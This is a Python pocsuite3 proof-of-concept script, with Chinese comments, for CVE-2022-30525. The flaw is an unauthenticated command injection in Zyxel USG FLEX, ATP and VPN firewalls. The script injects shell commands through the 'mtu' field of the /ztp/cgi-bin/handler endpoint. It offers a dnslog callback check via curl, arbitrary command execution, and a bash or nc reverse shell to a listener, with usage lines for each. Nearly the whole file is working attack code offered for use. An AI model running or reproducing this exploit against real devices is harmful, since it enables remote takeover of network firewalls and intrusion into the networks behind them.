from collections import OrderedDict
from urllib.parse import urljoin
import re,os
import base64
from requests_toolbelt import MultipartEncoder
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, OptString, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY,get_listener_ip,get_listener_port


class POC(POCBase):
    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  #默认为1
    author = ['']  #  PoC作者的大名
    vulDate = '2022-05-14'  #漏洞公开的时间,不知道就写今天
    createDate = '2022-05-14'  # 编写 PoC 的日期
    updateDate = '2022-05-14'  # PoC 更新的时间,默认和编写时间一样
    references = ['https://mp.weixin.qq.com/s/du56JX1ft03Z-YtM2C2E8A']  # 漏洞地址来源,0day不用写
    name = 'Zyxel USG FLEX handler rce'  # PoC 名称
    appPowerLink = ''  # 漏洞厂商主页地址
    appName = 'Zyxel'  # 漏洞应用名称
    appVersion = ''''''  # 漏洞影响版本
    vulType = VUL_TYPE.COMMAND_EXECUTION  #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        Rapid7 发现并报告了一个漏洞，该漏洞影响支持零接触配置 (ZTP) 的 Zyxel 防火墙，其中包括 ATP 系列、VPN 系列和 USG FLEX 系列（包括 USG20-VPN 和 USG20W-VPN）。
        该漏洞标识为 CVE-2022-30525，允许未经身份验证的远程攻击者以nobody受影响设备上的用户身份执行任意代码。 
    '''

    # 漏洞简要描述
    samples = ['']  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = '''
    检测: pocsuite -r poc.py -u url(-f url.txt) --verify 
    利用：pocsuite -r poc.py -u url(-f url.txt) --attack --command "命令"
    反弹shell: pocsuite -r poc.py -u url(-f url.txt) --shell --lhost (反弹地址) --lport (反弹端口)
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE

    def _options(self):
        o = OrderedDict()
        payload = {
            "nc": REVERSE_PAYLOAD.NC,
            "bash": REVERSE_PAYLOAD.BASH.format(get_listener_ip(), get_listener_port()),
        }
        o["command"] = OptDict(selected="bash", default=payload)
        
        return o

    def _verify(self):
        #获取dnslog域名
        session=requests.session()
        domain=session.get('http://www.dnslog.cn/getdomain.php').text
        #print(domain)
        result = {}
        path = "/ztp/cgi-bin/handler"
        headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
            'Content-Type': 'application/json'
            }
        data = {"command":"setWanPortSt","proto":"dhcp","port":"4","vlan_tagged":"1","vlanid":"5","mtu":";curl "+domain+"","data":"hi","hhx13szsclc":"="}
        #print(data)
        url = self.url + path
        try:
            resq = requests.post(url=url,headers=headers,json=data)
            resq2 = session.get('http://www.dnslog.cn/getrecords.php')
            #print('DNSLOG 返回信息 '+resq2.text)
            if str(domain) in resq2.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['DNSLOG 返回信息'] = resq2.text
        except Exception as e:
            return
        return self.parse_output(result)

    def _attack(self):
        result = {}
        path = "/ztp/cgi-bin/handler"
        headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
            'Content-Type': 'application/json'
            }
        cmd = self.get_option("command")
        data = {"command":"setWanPortSt","proto":"dhcp","port":"4","vlan_tagged":"1","vlanid":"5","mtu":";"+cmd+"","data":"hi","hhx13szsclc":"="}
        #print(data)
        url = self.url + path
        try:
            resq = requests.post(url=url,headers=headers,json=data)
            if resq:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['POC'] = url
        except Exception as e:
            return
    
    def _shell(self):
        result = {}
        path = "/ztp/cgi-bin/handler"
        url = self.url + path
        cmd = self.get_option("command")
        headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
            'Content-Type': 'application/json'
            }
        data = {"command":"setWanPortSt","proto":"dhcp","port":"4","vlan_tagged":"1","vlanid":"5","mtu":";"+cmd+"","data":"hi","hhx13szsclc":"="}
        
        try:
            resq = requests.post(url=url,headers=headers,json=data)
            if resq:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['POC'] = url
        except Exception as e:
            return

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

register_poc(POC)
